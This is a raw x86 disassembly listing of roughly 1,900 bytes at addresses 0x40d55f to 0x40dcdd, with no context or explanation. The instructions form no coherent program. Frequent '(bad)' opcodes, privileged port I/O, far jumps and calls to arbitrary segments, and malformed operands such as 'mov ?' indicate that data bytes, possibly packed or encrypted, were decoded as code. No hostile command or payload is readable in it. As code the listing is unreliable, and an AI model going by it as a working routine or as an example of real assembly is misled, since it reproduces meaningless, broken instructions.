  40d55f:	leave  
  40d560:	cmp    ch,0xf5
  40d563:	mov    ecx,fs
  40d565:	pop    ds
  40d566:	mov    dl,ch
  40d568:	mov    ah,0x1
  40d56a:	aad    0x6d
  40d56c:	je     0x40d524
  40d56e:	pushf  
  40d56f:	bswap  esp
  40d571:	ret    
  40d572:	xchg   BYTE PTR [edx-0x5e71377d],bh
  40d578:	jo     0x40d5a0
  40d57a:	dec    eax
  40d57b:	or     esp,0xffffff98
  40d57e:	pcmpgtb mm7,QWORD PTR [ebp+0x533e245c]
  40d585:	call   0x3969:0xf6b6eb2d
  40d58c:	sub    DWORD PTR [ebp+0x6f8a8de5],0xae0b5316
  40d596:	xor    BYTE PTR [eax+ebx*8-0x12],dl
  40d59a:	jge    0x40d559
  40d59c:	lods   al,BYTE PTR ds:[esi]
  40d59d:	(bad)  
  40d59e:	push   ds
  40d59f:	leave  
  40d5a0:	mov    dl,0xdd
  40d5a2:	mov    WORD PTR [ebx-0x122a91d5],ss
  40d5a8:	xlat   BYTE PTR ds:[ebx]
  40d5a9:	sbb    al,0x18
  40d5ab:	jb     0x40d557
  40d5ad:	js     0x40d5f9
  40d5af:	sbb    DWORD PTR [edi],eax
  40d5b1:	pop    edx
  40d5b2:	inc    esi
  40d5b3:	adc    DWORD PTR ds:0x2723013d,esi
  40d5b9:	xchg   esi,eax
  40d5ba:	and    DWORD PTR ds:0x7db9cc3e,edi
  40d5c0:	jmp    0x6e1d:0x3082e72c
  40d5c7:	mov    esi,0x83d5bef
  40d5cc:	jnp    0x40d5ce
  40d5ce:	rcl    DWORD PTR [esi-0x2e95b071],cl
  40d5d4:	popf   
  40d5d5:	call   0xe52975
  40d5da:	mov    cl,0x41
  40d5dc:	pop    ds
  40d5dd:	mov    bl,0xe
  40d5df:	push   eax
  40d5e0:	adc    edi,DWORD PTR [ecx]
  40d5e2:	mov    ecx,0xc957392e
  40d5e7:	sbb    BYTE PTR [esi+0x733ec1fc],bh
  40d5ed:	adc    ah,al
  40d5ef:	xor    eax,0x80f756b3
  40d5f4:	adc    edx,DWORD PTR [edi]
  40d5f6:	adc    ecx,DWORD PTR [edi]
  40d5f8:	push   esp
  40d5f9:	rep ins BYTE PTR es:[edi],dx
  40d5fb:	cmp    BYTE PTR [edx],0xf3
  40d5fe:	popa   
  40d5ff:	sub    eax,DWORD PTR ds:0x953ad2eb
  40d605:	rcl    BYTE PTR [edi+0x1a],cl
  40d608:	dec    edi
  40d609:	leave  
  40d60a:	mov    ds:0x5d1dfc05,eax
  40d60f:	mov    ecx,0x6ef12bb
  40d614:	jb     0x40d616
  40d616:	ins    DWORD PTR es:[edi],dx
  40d617:	shl    BYTE PTR [ebx],0x7
  40d61a:	and    BYTE PTR [ebx+ebx*8-0x7afbdb85],cl
  40d621:	mov    BYTE PTR [ebx+edx*2+0x4abcf655],al
  40d628:	jmp    0x222:0xc149bdc0
  40d62f:	pop    ecx
  40d630:	mov    bh,BYTE PTR [edi+ebx*4+0x30]
  40d634:	stc    
  40d635:	jp     0x40d693
  40d637:	dec    eax
  40d638:	aaa    
  40d639:	in     eax,0x24
  40d63b:	inc    edi
  40d63c:	bnd jl 0x40d6b2
  40d63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d640:	rcl    BYTE PTR [edx+0x5019038e],0x5b
  40d647:	mov    esp,0xf2a8de24
  40d64c:	loopne 0x40d607
  40d64e:	in     al,dx
  40d64f:	loope  0x40d6ac
  40d651:	aas    
  40d652:	imul   edx,DWORD PTR [esi],0xba644947
  40d658:	sbb    BYTE PTR [ebx+0x55],bl
  40d65b:	js     0x40d689
  40d65d:	out    dx,eax
  40d65e:	push   es
  40d65f:	mov    ecx,0x61bdd2e5
  40d664:	mov    edx,ecx
  40d666:	ins    DWORD PTR es:[edi],dx
  40d667:	xlat   BYTE PTR ds:[ebx]
  40d668:	dec    esi
  40d669:	dec    ebx
  40d66a:	cmp    BYTE PTR [ebx+edx*8],ah
  40d66d:	and    ecx,DWORD PTR [eax-0x1a7affa1]
  40d673:	xchg   ebx,eax
  40d674:	ret    0xde7b
  40d677:	dec    esi
  40d678:	ins    BYTE PTR es:[edi],dx
  40d679:	jae    0x40d667
  40d67b:	xchg   ebx,eax
  40d67c:	stos   DWORD PTR es:[edi],eax
  40d67d:	inc    ebx
  40d67e:	mov    dl,0xd0
  40d680:	mul    DWORD PTR [eax+0x4e1e538d]
  40d686:	data16 outs dx,BYTE PTR ds:[esi]
  40d688:	mov    al,ds:0x9f27193
  40d68d:	mov    eax,0x798fe308
  40d692:	jns    0x40d70d
  40d694:	lods   al,BYTE PTR ds:[esi]
  40d695:	call   0x9f99edd9
  40d69a:	call   0xb6e97b1f
  40d69f:	xchg   esi,eax
  40d6a0:	or     dh,BYTE PTR [edi+eax*8]
  40d6a3:	std    
  40d6a4:	and    DWORD PTR [esi+esi*2+0x58a0c8b7],edi
  40d6ab:	sbb    al,0x66
  40d6ad:	cs scas eax,DWORD PTR es:[edi]
  40d6af:	leave  
  40d6b0:	out    dx,eax
  40d6b1:	mov    ebx,0xaed8d628
  40d6b6:	pop    es
  40d6b7:	xlat   BYTE PTR ds:[ebx]
  40d6b8:	sbb    esp,ecx
  40d6ba:	pop    ebp
  40d6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6bc:	(bad)  
  40d6bd:	cli    
  40d6be:	out    dx,eax
  40d6bf:	arpl   WORD PTR [esi-0x99b924a],bp
  40d6c5:	sbb    BYTE PTR [eax-0x63],bl
  40d6c8:	add    eax,0x8d83c103
  40d6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ce:	lods   al,BYTE PTR ds:[esi]
  40d6cf:	fwait
  40d6d0:	and    BYTE PTR fs:[ebx-0x25],0x7a
  40d6d5:	jg     0x40d6f5
  40d6d7:	mov    bh,al
  40d6d9:	mov    al,ds:0x76123834
  40d6de:	sub    dh,BYTE PTR [ebx]
  40d6e0:	jno    0x40d731
  40d6e2:	fist   WORD PTR [ecx]
  40d6e4:	sub    ah,BYTE PTR [esi+0x73e12a10]
  40d6ea:	mov    ebp,0x62444c18
  40d6ef:	add    DWORD PTR [ebp+eiz*8+0x15228ff],eax
  40d6f6:	ins    DWORD PTR es:[edi],dx
  40d6f7:	jp     0x40d736
  40d6f9:	sub    edi,DWORD PTR [ebp-0x34]
  40d6fc:	mov    al,ds:0x2c095aaf
  40d701:	xchg   ebx,eax
  40d702:	(bad)  
  40d703:	iret   
  40d704:	mov    ebx,0xb3803384
  40d709:	sbb    ch,al
  40d70b:	data16 mov cl,0x53
  40d70e:	push   edi
  40d70f:	leave  
  40d710:	mov    bh,0x19
  40d712:	cdq    
  40d713:	xor    al,0xd2
  40d715:	cmp    esi,esi
  40d717:	fwait
  40d718:	adc    al,0x0
  40d71a:	jns    0x40d728
  40d71c:	mov    ah,0x1c
  40d71e:	mov    dh,0xed
  40d720:	xor    dl,BYTE PTR [esi-0x698c5317]
  40d726:	and    eax,edx
  40d728:	xchg   BYTE PTR [ecx+0x7d],bl
  40d72b:	xor    eax,0x86e8ba7f
  40d730:	jns    0x40d749
  40d732:	es addr16 or eax,0x54e1a018
  40d739:	jne    0x40d6d7
  40d73b:	je     0x40d6d1
  40d73d:	pop    eax
  40d73e:	cwde   
  40d73f:	inc    ebp
  40d740:	mov    esp,0x1c5e944
  40d745:	es mov edx,0xdc9d1425
  40d74b:	fsub   st,st(7)
  40d74d:	pop    ss
  40d74e:	repz push es
  40d750:	retf   
  40d751:	mov    esi,ebp
  40d753:	cmp    esp,esp
  40d755:	mov    WORD PTR [edx],fs
  40d757:	outs   dx,DWORD PTR ds:[esi]
  40d758:	lods   eax,DWORD PTR ds:[esi]
  40d759:	aas    
  40d75a:	sti    
  40d75b:	jle    0x40d768
  40d75d:	push   eax
  40d75e:	sti    
  40d75f:	das    
  40d760:	fs push ebp
  40d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d763:	sbb    DWORD PTR [edx-0x7c137ca9],edx
  40d769:	ss cli 
  40d76b:	pop    es
  40d76c:	add    esi,eax
  40d76e:	xchg   edx,eax
  40d76f:	(bad)  
  40d770:	iret   
  40d771:	push   esp
  40d772:	call   0xe660c4d5
  40d777:	or     esp,0xc55f2577
  40d77d:	adc    al,0xe
  40d77f:	dec    dl
  40d781:	cmp    edi,DWORD PTR ds:0x5ef7eed9
  40d787:	inc    ebx
  40d788:	icebp  
  40d789:	aas    
  40d78a:	mov    esi,0x364ff1a4
  40d78f:	jno    0x40d7ca
  40d791:	in     eax,dx
  40d792:	pop    ecx
  40d793:	inc    ecx
  40d794:	adc    bl,cl
  40d796:	adc    DWORD PTR [edx],edx
  40d798:	outs   dx,BYTE PTR ds:[esi]
  40d799:	pop    es
  40d79a:	dec    esp
  40d79b:	cmp    al,0xcf
  40d79d:	xor    BYTE PTR [esi-0x37],cl
  40d7a0:	fs jnp 0x40d75e
  40d7a3:	test   eax,0xe33de021
  40d7a9:	add    eax,0xa78ce779
  40d7ae:	xchg   ebx,eax
  40d7af:	fdiv   st,st(1)
  40d7b1:	jb     0x40d765
  40d7b3:	add    DWORD PTR [ebp+0x0],ecx
  40d7b6:	aam    0x20
  40d7b8:	jmp    0x40d76e
  40d7ba:	leave  
  40d7bb:	cdq    
  40d7bc:	jge    0x40d7fe
  40d7be:	sub    ah,BYTE PTR [ecx-0x3c5c6ef2]
  40d7c4:	dec    esp
  40d7c5:	jge    0x40d7fe
  40d7c7:	mov    esp,0xe2490580
  40d7cc:	fcomip st,st(6)
  40d7ce:	repnz push 0x6f964207
  40d7d4:	clc    
  40d7d5:	inc    eax
  40d7d6:	push   ecx
  40d7d7:	out    dx,al
  40d7d8:	cld    
  40d7d9:	inc    ebx
  40d7da:	fsubr  QWORD PTR [edi+0x13e6db9f]
  40d7e0:	fs test eax,0xe9099fe
  40d7e6:	add    DWORD PTR fs:[eax+0x7bbddc07],0xb18868af
  40d7f1:	mov    al,0x6c
  40d7f3:	out    0xad,eax
  40d7f5:	pop    ss
  40d7f6:	fisttp WORD PTR [edi]
  40d7f8:	pop    edx
  40d7f9:	fs pop edi
  40d7fb:	outs   dx,BYTE PTR ds:[esi]
  40d7fc:	xor    BYTE PTR [esp+eax*2-0x7f],dh
  40d800:	xor    bh,ch
  40d802:	xchg   ecx,esp
  40d804:	inc    eax
  40d805:	and    eax,0xd0db7ec6
  40d80a:	ds jbe 0x40d85f
  40d80d:	pop    edi
  40d80e:	jmp    0x804f0b32
  40d813:	dec    esi
  40d814:	pop    ds
  40d815:	cdq    
  40d816:	adc    al,0x38
  40d818:	jne    0x40d7d8
  40d81a:	lock adc BYTE PTR [edx],ah
  40d81d:	in     eax,0x6a
  40d81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d820:	mov    al,ds:0x6c98612
  40d825:	xchg   esp,eax
  40d826:	mov    ebx,0xcf4308fa
  40d82b:	xor    al,0xcd
  40d82d:	add    al,0xee
  40d82f:	mov    eax,0x12dec62c
  40d834:	fdiv   DWORD PTR [ebp+0x4d1384e0]
  40d83a:	pop    eax
  40d83b:	pop    ecx
  40d83c:	mov    edi,0xe1186759
  40d841:	jmp    0x5420fbda
  40d846:	sub    eax,0x5fd8e892
  40d84b:	pop    ds
  40d84c:	cwde   
  40d84d:	sbb    DWORD PTR [edi+esi*8],edi
  40d850:	out    dx,eax
  40d851:	imul   ebp,DWORD PTR [edx-0xd103b75],0xffffffeb
  40d858:	mov    ds:0x6e4151b8,al
  40d85d:	(bad)
  40d861:	mov    WORD PTR [edx+0x54],es
  40d864:	or     bl,BYTE PTR [edi+esi*8-0x47]
  40d868:	cmp    esp,DWORD PTR [edx+0x35]
  40d86b:	out    0xec,al
  40d86d:	add    al,0x9d
  40d86f:	daa    
  40d870:	lods   eax,DWORD PTR ds:[esi]
  40d871:	ds xor eax,0x25a805ac
  40d877:	stc    
  40d878:	shl    esp,1
  40d87a:	pop    ds
  40d87b:	cmp    ebp,edx
  40d87d:	iret   
  40d87e:	mov    edi,0x27bd162b
  40d883:	jg     0x40d8e3
  40d885:	add    dl,BYTE PTR [edi+edi*2+0x68a357d5]
  40d88c:	cld    
  40d88d:	pop    edi
  40d88e:	jle    0x40d83a
  40d890:	or     ch,BYTE PTR [ecx+0xfd83c62]
  40d896:	pop    ecx
  40d897:	rcl    DWORD PTR [eax],1
  40d899:	xchg   ecx,eax
  40d89a:	mov    ebx,0xf6f2e0ce
  40d89f:	xor    ah,BYTE PTR [edx+0x51]
  40d8a2:	pop    es
  40d8a3:	mov    ss,edi
  40d8a5:	test   DWORD PTR [esp+eiz*8+0x6b],ebx
  40d8a9:	mov    ch,0x6
  40d8ab:	or     DWORD PTR [eax+0x7ab8048c],esp
  40d8b1:	mov    esi,0x9b90cfc0
  40d8b6:	inc    ecx
  40d8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b8:	(bad)  
  40d8b9:	adc    al,0xbe
  40d8bb:	and    DWORD PTR [edx-0x67156772],edi
  40d8c1:	scas   al,BYTE PTR es:[edi]
  40d8c2:	in     eax,dx
  40d8c3:	jle    0x40d912
  40d8c5:	in     eax,0x58
  40d8c7:	fst    DWORD PTR [ecx-0x5c720ec5]
  40d8cd:	into   
  40d8ce:	inc    edx
  40d8cf:	clc    
  40d8d0:	inc    ebx
  40d8d1:	sub    DWORD PTR [edi-0x63],edi
  40d8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8d5:	stc    
  40d8d6:	push   es
  40d8d7:	add    eax,0xbb2f586a
  40d8dc:	ror    BYTE PTR [esi+0x56],cl
  40d8df:	push   DWORD PTR [edi+0x3a]
  40d8e2:	dec    esi
  40d8e3:	sub    ebx,DWORD PTR [ebx-0x277c875c]
  40d8e9:	jb     0x40d908
  40d8eb:	in     eax,0x7e
  40d8ed:	cld    
  40d8ee:	pop    edx
  40d8ef:	push   0x54
  40d8f1:	das    
  40d8f2:	ins    DWORD PTR es:[edi],dx
  40d8f3:	iret   
  40d8f4:	jnp    0x40d88f
  40d8f6:	int    0x26
  40d8f8:	jns    0x40d912
  40d8fa:	popa   
  40d8fb:	out    dx,al
  40d8fc:	loop   0x40d8c3
  40d8fe:	call   0xf967:0x13300dd0
  40d905:	call   DWORD PTR [edi]
  40d907:	sub    ebx,esi
  40d909:	in     eax,0x7d
  40d90b:	cdq    
  40d90c:	push   ebp
  40d90d:	test   eax,0xf52647cf
  40d912:	inc    eax
  40d913:	pop    ebp
  40d914:	rol    DWORD PTR [ebp+0x568c9422],cl
  40d91a:	mov    al,ds:0xb344d515
  40d91f:	push   es
  40d920:	les    esp,FWORD PTR [esi]
  40d922:	dec    edi
  40d923:	mov    DWORD PTR [ecx],esp
  40d925:	or     eax,0x78bab111
  40d92a:	(bad)  
  40d92b:	mov    eax,ds:0x854a736a
  40d930:	add    DWORD PTR [esp+edx*2],edi
  40d933:	cmp    DWORD PTR [ecx],ebx
  40d935:	mov    ebx,0xf2c885ee
  40d93a:	add    al,0x3d
  40d93c:	pusha  
  40d93d:	mov    esp,0x2bfa594b
  40d942:	popf   
  40d943:	outs   dx,DWORD PTR ds:[esi]
  40d944:	or     ebx,DWORD PTR [edx+eax*4+0x41d93b01]
  40d94b:	js     0x40d96f
  40d94d:	xlat   BYTE PTR ds:[ebx]
  40d94e:	inc    edi
  40d94f:	xor    eax,0xe213b20d
  40d954:	ins    DWORD PTR es:[edi],dx
  40d955:	xor    DWORD PTR [eax-0x22],eax
  40d958:	dec    esp
  40d959:	mov    ebx,0xd455d07a
  40d95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d95f:	and    bh,BYTE PTR [edx-0x4440bf73]
  40d965:	push   0xffffff94
  40d967:	fs fs out dx,eax
  40d96a:	jge    0x40d931
  40d96c:	fwait
  40d96d:	jge    0x40d8f8
  40d96f:	cli    
  40d970:	inc    esp
  40d971:	xor    eax,0x74544491
  40d976:	clc    
  40d977:	(bad)  
  40d979:	push   edx
  40d97a:	jnp    0x40d97e
  40d97c:	adc    eax,0xf89278b4
  40d981:	jne    0x40d938
  40d983:	mov    ecx,0x75828b29
  40d988:	les    ebp,FWORD PTR [ebp+0x496b6843]
  40d98e:	sub    esp,DWORD PTR [esp+eax*4-0x55]
  40d992:	sar    BYTE PTR [edx-0x5799b6fa],cl
  40d998:	add    al,0x1f
  40d99a:	sbb    dl,BYTE PTR [eax-0x1ee1721a]
  40d9a0:	call   0xb7fa:0x9e449ffa
  40d9a7:	or     esp,esi
  40d9a9:	xor    ecx,ecx
  40d9ab:	mov    DWORD PTR [eax-0x11cb2ee9],esi
  40d9b1:	jne    0x40d963
  40d9b3:	clc    
  40d9b4:	je     0x40d9d6
  40d9b6:	fmul   st(3),st
  40d9b8:	repnz fimul DWORD PTR [edx]
  40d9bb:	addr16 jp 0x40da24
  40d9be:	mov    ah,0x47
  40d9c0:	jo     0x40da32
  40d9c2:	add    BYTE PTR [edi-0x3a691437],al
  40d9c8:	push   esp
  40d9c9:	mov    ebp,DWORD PTR [edx+0x55]
  40d9cc:	jle    0x40d968
  40d9ce:	sub    BYTE PTR [esi-0x2e],0xa7
  40d9d2:	dec    edi
  40d9d3:	data16 or al,0x75
  40d9d6:	inc    esp
  40d9d7:	cld    
  40d9d8:	and    eax,0xbda421de
  40d9dd:	je     0x40d9a7
  40d9df:	xchg   BYTE PTR [ebx-0x6e0cd736],al
  40d9e5:	or     BYTE PTR [eax+ebx*4+0x478fd585],al
  40d9ec:	push   edi
  40d9ed:	dec    esp
  40d9ee:	jmp    0x3f9e2a95
  40d9f3:	rcr    BYTE PTR [edx+edi*1],0x48
  40d9f7:	fist   WORD PTR [edi-0x6f]
  40d9fa:	or     esi,ebp
  40d9fc:	push   ds
  40d9fd:	pusha  
  40d9fe:	out    0x59,eax
  40da00:	mov    ah,0xe9
  40da02:	packuswb mm5,QWORD PTR [ecx-0x3781d8ed]
  40da09:	pop    ebp
  40da0a:	aad    0xf6
  40da0c:	adc    DWORD PTR [esi-0x7668b5d6],esi
  40da12:	icebp  
  40da13:	jecxz  0x40da35
  40da15:	dec    esi
  40da16:	ror    DWORD PTR [esi],cl
  40da18:	ds cdq 
  40da1a:	mul    DWORD PTR [edx+0xfbd81a6]
  40da20:	add    DWORD PTR [eax],edi
  40da22:	and    DWORD PTR [eax],0xffffffbc
  40da25:	daa    
  40da26:	jmp    0x40da7d
  40da28:	sbb    al,0x41
  40da2a:	call   0xf2f7f949
  40da2f:	adc    DWORD PTR [edx+0x2c],esi
  40da32:	sbb    al,0xee
  40da34:	xchg   ecx,eax
  40da35:	jne    0x40da32
  40da37:	fisubr DWORD PTR [edi-0x17040ca6]
  40da3d:	xchg   ebx,eax
  40da3e:	add    eax,0x28a4446a
  40da43:	js     0x40da01
  40da45:	push   eax
  40da46:	aaa    
  40da47:	(bad)
  40da4a:	push   esi
  40da4b:	enter  0xf171,0xd0
  40da4f:	pop    ecx
  40da50:	repz inc esp
  40da52:	sahf   
  40da53:	fcomp  st(1)
  40da55:	jecxz  0x40da50
  40da57:	or     DWORD PTR [eax+ecx*4+0x298a1a46],ecx
  40da5e:	(bad)  
  40da5f:	std    
  40da60:	or     DWORD PTR [eax],esp
  40da62:	es aas 
  40da64:	adc    eax,ecx
  40da66:	cdq    
  40da67:	sbb    al,BYTE PTR ds:0x7ae88c04
  40da6d:	call   FWORD PTR [edi]
  40da6f:	and    BYTE PTR [ecx],cl
  40da71:	jae    0x40da5a
  40da73:	add    BYTE PTR [edi-0x60be27c],dl
  40da79:	scas   eax,DWORD PTR es:[edi]
  40da7a:	cmp    al,BYTE PTR [esi+0x41]
  40da7d:	jnp    0x40da3e
  40da7f:	mov    cl,0x1e
  40da81:	jo     0x40da2b
  40da83:	xchg   ebx,eax
  40da84:	jmp    0x72f8216f
  40da89:	push   ds
  40da8a:	(bad)  
  40da8b:	xor    al,0x1
  40da8d:	rcl    DWORD PTR [ebx+edi*4],1
  40da90:	lahf   
  40da91:	adc    ebx,DWORD PTR [edi-0x6e]
  40da94:	aam    0xe0
  40da96:	aad    0x7c
  40da98:	pop    esp
  40da99:	dec    edi
  40da9a:	popf   
  40da9b:	scas   al,BYTE PTR es:[edi]
  40da9c:	aaa    
  40da9d:	jns    0x40db03
  40da9f:	jae    0x40daa2
  40daa1:	xor    al,0xea
  40daa3:	inc    esi
  40daa4:	and    al,0x80
  40daa6:	mov    ds:0xbf0a8819,al
  40daab:	outs   dx,BYTE PTR ds:[esi]
  40daac:	lods   al,BYTE PTR ds:[esi]
  40daad:	sahf   
  40daae:	je     0x40dab1
  40dab0:	jge    0x40da62
  40dab2:	cmp    eax,0xb11263e
  40dab7:	dec    ecx
  40dab8:	mov    ds:0x98977dbd,eax
  40dabd:	and    BYTE PTR [ebx-0x2],ah
  40dac0:	repnz fbstp TBYTE PTR [edx-0x2b24df06]
  40dac7:	fstp   QWORD PTR [eax+0x316e9968]
  40dacd:	hlt    
  40dace:	push   ebp
  40dacf:	jne    0x40db0f
  40dad1:	pop    ebp
  40dad3:	fsubr  DWORD PTR [eax-0x3b]
  40dad6:	adc    BYTE PTR [ebp-0x5],bh
  40dad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dada:	lock push ecx
  40dadc:	sbb    DWORD PTR [esi+0x77dac4a6],ebx
  40dae2:	or     dh,BYTE PTR [ebp+eiz*8+0x57fba559]
  40dae9:	pushf  
  40daea:	xor    BYTE PTR [edi],dl
  40daec:	mov    cl,ch
  40daee:	adc    DWORD PTR [ecx+0x265d9402],eax
  40daf4:	imul   esp,DWORD PTR [edx],0x2a
  40daf7:	inc    ebp
  40daf8:	push   ecx
  40daf9:	fsub   QWORD PTR [ecx-0x26]
  40dafc:	in     eax,0x0
  40dafe:	push   edi
  40daff:	test   al,0x34
  40db01:	in     al,dx
  40db02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db03:	sub    ebx,DWORD PTR [ebx+0x73]
  40db06:	dec    eax
  40db07:	pop    esi
  40db08:	inc    eax
  40db09:	test   eax,0x62decc41
  40db0e:	call   0xe271:0xe68ca453
  40db15:	(bad)  
  40db18:	jp     0x40db57
  40db1a:	inc    edi
  40db1b:	add    bl,bh
  40db1d:	lods   al,BYTE PTR ds:[esi]
  40db1e:	inc    edx
  40db1f:	cmp    edi,DWORD PTR [edx+edi*8+0x4eaa1610]
  40db26:	jecxz  0x40db4f
  40db28:	sub    al,BYTE PTR [edx-0xdd89556]
  40db2e:	dec    esp
  40db2f:	stc    
  40db30:	ds inc esi
  40db32:	cmp    eax,0xf0db31c8
  40db37:	mov    esi,0xf53dc57
  40db3c:	(bad)  
  40db3e:	sti    
  40db3f:	icebp  
  40db40:	push   0x169adae9
  40db45:	sbb    DWORD PTR [edi-0x85fd5cc],ebx
  40db4b:	push   ebx
  40db4c:	jmp    0x265:0x57458031
  40db53:	cwde   
  40db54:	mov    ?,WORD PTR [ebp+0x46]
  40db57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db59:	mov    ebp,0xe1d4fd32
  40db5e:	sub    al,0x1b
  40db60:	retf   0x4ddc
  40db63:	sti    
  40db64:	outs   dx,BYTE PTR ds:[esi]
  40db65:	mov    ebx,0xed3e83e7
  40db6a:	adc    eax,0xcb1d91e9
  40db6f:	mov    bh,0x78
  40db71:	xor    eax,0x316ed64f
  40db76:	mov    ?,WORD PTR [esi]
  40db78:	pop    ds
  40db79:	xchg   ebx,eax
  40db7a:	or     eax,edx
  40db7c:	outs   dx,DWORD PTR ds:[esi]
  40db7d:	jno    0x40db46
  40db7f:	popa   
  40db80:	stos   DWORD PTR es:[edi],eax
  40db81:	mov    bl,0xaa
  40db83:	adc    BYTE PTR [esi+0x5efe65a7],bl
  40db89:	push   ecx
  40db8a:	aam    0xa
  40db8c:	cwde   
  40db8d:	pusha  
  40db8e:	sbb    BYTE PTR [esi-0x40],al
  40db91:	loope  0x40dba0
  40db93:	inc    ecx
  40db94:	test   eax,0x41409679
  40db99:	adc    eax,0x6f11153a
  40db9e:	sbb    ebp,eax
  40dba0:	jecxz  0x40dbb7
  40dba2:	test   BYTE PTR [eax],dl
  40dba4:	cmp    eax,0xe3c74bca
  40dba9:	mov    ah,0x74
  40dbab:	cld    
  40dbac:	jp     0x40dc16
  40dbae:	fwait
  40dbaf:	dec    esi
  40dbb0:	fadd   DWORD PTR [eax*8+0x79ac95ad]
  40dbb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbb8:	lds    ebp,FWORD PTR [esp+eiz*2-0x7f]
  40dbbc:	into   
  40dbbd:	jge    0x40db53
  40dbbf:	(bad)  
  40dbc0:	xor    DWORD PTR [edx],ecx
  40dbc2:	ins    DWORD PTR es:[edi],dx
  40dbc3:	xchg   ebx,eax
  40dbc4:	push   cs
  40dbc5:	sbb    al,0x76
  40dbc7:	pop    ds
  40dbc8:	xchg   si,ax
  40dbca:	in     eax,dx
  40dbcb:	jns    0x40dc3a
  40dbcd:	idiv   dl
  40dbcf:	or     al,0x5c
  40dbd1:	outs   dx,DWORD PTR ds:[esi]
  40dbd2:	pop    ebx
  40dbd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbd4:	xchg   ecx,eax
  40dbd5:	rol    BYTE PTR [ecx],cl
  40dbd7:	dec    esp
  40dbd8:	cdq    
  40dbd9:	fcomp  st(4)
  40dbdb:	xchg   edx,eax
  40dbdc:	xchg   edx,eax
  40dbdd:	sub    al,0xc6
  40dbdf:	inc    esi
  40dbe0:	sub    esp,eax
  40dbe2:	push   edi
  40dbe3:	and    al,0x92
  40dbe5:	inc    ebp
  40dbe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe7:	adc    al,0xcb
  40dbe9:	dec    eax
  40dbea:	mov    eax,0x3941b3a0
  40dbef:	push   eax
  40dbf0:	inc    ebx
  40dbf1:	stos   DWORD PTR es:[edi],eax
  40dbf2:	(bad)  
  40dbf3:	dec    esi
  40dbf4:	imul   DWORD PTR [edi+eiz*1+0x61]
  40dbf8:	push   0xfffffffb
  40dbfa:	cmp    eax,0x17874375
  40dbff:	int    0x9c
  40dc01:	bound  edx,QWORD PTR [ebp+0x36]
  40dc04:	cmp    DWORD PTR [ebp-0x72],edx
  40dc07:	shl    ecx,cl
  40dc09:	xor    DWORD PTR [ecx+0x32],0x87e709a4
  40dc10:	cmp    bl,BYTE PTR [esi+edi*1+0x79]
  40dc14:	mov    ch,0xf6
  40dc16:	pop    esp
  40dc17:	xchg   ebx,eax
  40dc18:	jmp    0x6140:0xee21b2e0
  40dc1f:	je     0x40dbb0
  40dc21:	adc    bh,BYTE PTR [edx]
  40dc23:	ja     0x40dca1
  40dc25:	adc    ebx,ebx
  40dc27:	lock int 0x25
  40dc2a:	scas   eax,DWORD PTR es:[edi]
  40dc2b:	push   eax
  40dc2c:	imul   edx,ecx,0xffffff8f
  40dc2f:	setbe  BYTE PTR [esi]
  40dc32:	and    ebx,esp
  40dc34:	jno    0x40dbcb
  40dc36:	sar    BYTE PTR ds:0x6b14f692,1
  40dc3c:	mov    eax,0x14f386d7
  40dc41:	jae    0x40dbfc
  40dc43:	jns    0x40dc1a
  40dc45:	pop    ebp
  40dc46:	out    dx,al
  40dc47:	fs jl  0x40dca0
  40dc4a:	ds imul ebp,esi,0x36
  40dc4e:	xchg   edi,edi
  40dc50:	adc    ecx,DWORD PTR [edx]
  40dc52:	psrlq  mm0,0x3f
  40dc56:	jnp    0x40dcc1
  40dc58:	out    0x24,al
  40dc5a:	mov    edi,0xdd1a5f92
  40dc5f:	mov    edx,0xd6fe828e
  40dc64:	mov    ds,WORD PTR [ebx]
  40dc66:	fwait
  40dc67:	and    eax,0x29b8c2d1
  40dc6c:	jne    0x40dca3
  40dc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc6f:	enter  0xc2a2,0xca
  40dc73:	inc    esp
  40dc74:	and    eax,0x791cbd91
  40dc79:	mov    WORD PTR [eax+0x4b],ds
  40dc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc7d:	in     al,0xbf
  40dc7f:	mov    edx,0x2af152d7
  40dc84:	lea    esi,[edi*1-0x9bf5347]
  40dc8b:	add    eax,0xc8ca112a
  40dc90:	push   eax
  40dc91:	xor    ecx,DWORD PTR [ecx+0x6d]
  40dc94:	xchg   esi,eax
  40dc95:	sbb    eax,DWORD PTR [ebp-0x6a]
  40dc98:	mov    ecx,0x223d7c0d
  40dc9d:	and    dh,BYTE PTR [edi-0x14edf3]
  40dca3:	push   eax
  40dca4:	popa   
  40dca5:	shl    ebp,cl
  40dca7:	mov    al,ds:0xe8666077
  40dcac:	fmul   QWORD PTR [esi+0x39c53541]
  40dcb2:	loopne 0x40dd01
  40dcb4:	cwde   
  40dcb5:	cld    
  40dcb6:	fldcw  WORD PTR [edx+0x76]
  40dcb9:	(bad)  
  40dcba:	push   esi
  40dcbb:	and    DWORD PTR [edi+0xaa3e5c6],0x9bc6a6fc
  40dcc5:	ins    DWORD PTR es:[edi],dx
  40dcc6:	nop
  40dcc7:	test   eax,0xe9e93c16
  40dccc:	push   esi
  40dccd:	xchg   edi,eax
  40dcce:	and    DWORD PTR [eax],esi
  40dcd0:	sti    
  40dcd1:	xchg   ebx,eax
  40dcd2:	mov    dl,0x68
  40dcd4:	jecxz  0x40dd27
  40dcd6:	add    al,BYTE PTR [edx]
  40dcd8:	icebp  
  40dcd9:	test   al,0xab
  40dcdb:	outs   dx,DWORD PTR fs:[esi]
  40dcdd:	add    DWORD PTR [ecx+0x55],edx
